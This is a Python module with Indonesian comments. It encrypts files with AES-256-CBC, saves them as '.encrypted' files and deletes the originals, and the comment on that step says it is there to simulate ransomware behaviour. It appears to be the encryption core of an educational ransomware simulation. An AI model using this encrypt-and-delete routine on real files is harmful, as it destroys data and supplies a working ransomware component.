"""
Crypto Engine Module
Fungsi: Enkripsi file menggunakan AES-256
"""

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import os

class CryptoEngine:
    def __init__(self):
        self.key_size = 32  # AES-256 (32 bytes = 256 bits)
        self.block_size = AES.block_size  # 16 bytes
        
    def generate_symmetric_key(self):
        """
        Generate random AES key
        Returns: 32-byte random key
        """
        return get_random_bytes(self.key_size)
    
    def encrypt_file(self, file_path, symmetric_key):
        """
        Encrypt file dengan AES-256-CBC
        
        Args:
            file_path: Path ke file yang akan dienkripsi
            symmetric_key: AES key (32 bytes)
        
        Returns:
            (encrypted_data, iv): Encrypted data dan IV
        """
        try:
            # Read file content
            with open(file_path, "rb") as f:
                plaintext = f.read()
            
            # Generate random IV
            iv = get_random_bytes(self.block_size)
            
            # Create cipher
            cipher = AES.new(symmetric_key, AES.MODE_CBC, iv)
            
            # Pad plaintext and encrypt
            padded_plaintext = pad(plaintext, self.block_size)
            ciphertext = cipher.encrypt(padded_plaintext)
            
            print(f"[+] Encrypted: {file_path}")
            
            return ciphertext, iv
            
        except Exception as e:
            print(f"[-] Error encrypting {file_path}: {str(e)}")
            return None, None
    
    def decrypt_file(self, ciphertext, symmetric_key, iv):
        """
        Decrypt file dengan AES-256-CBC
        
        Args:
            ciphertext: Encrypted data
            symmetric_key: AES key (32 bytes)
            iv: Initialization Vector
        
        Returns:
            plaintext: Decrypted data
        """
        try:
            # Create cipher
            cipher = AES.new(symmetric_key, AES.MODE_CBC, iv)
            
            # Decrypt and unpad
            padded_plaintext = cipher.decrypt(ciphertext)
            plaintext = unpad(padded_plaintext, self.block_size)
            
            return plaintext
            
        except Exception as e:
            print(f"[-] Decryption error: {str(e)}")
            return None
    
    def write_encrypted_file(self, file_path, ciphertext, iv):
        """
        Write encrypted data ke file
        Format: [IV (16 bytes)][Ciphertext]
        """
        encrypted_path = file_path + ".encrypted"
        
        with open(encrypted_path, "wb") as f:
            f.write(iv)  # Write IV first
            f.write(ciphertext)
        
        # Delete original file (simulate ransomware behavior)
        os.remove(file_path)
        
        return encrypted_path
    
    def read_encrypted_file(self, encrypted_path):
        """
        Read encrypted file
        Returns: (ciphertext, iv)
        """
        with open(encrypted_path, "rb") as f:
            iv = f.read(self.block_size)  # First 16 bytes = IV
            ciphertext = f.read()  # Rest = ciphertext
        
        return ciphertext, iv


# Testing code
if __name__ == "__main__":
    # Create test file
    test_file = "test.txt"
    with open(test_file, "w") as f:
        f.write("This is a secret message!")
    
    # Encrypt
    ce = CryptoEngine()
    key = ce.generate_symmetric_key()
    ciphertext, iv = ce.encrypt_file(test_file, key)
    encrypted_path = ce.write_encrypted_file(test_file, ciphertext, iv)
    
    print(f"Key: {key.hex()}")
    print(f"IV: {iv.hex()}")
    print(f"Encrypted file: {encrypted_path}")
    
    # Decrypt
    ciphertext, iv = ce.read_encrypted_file(encrypted_path)
    plaintext = ce.decrypt_file(ciphertext, key, iv)
    print(f"Decrypted: {plaintext.decode()}")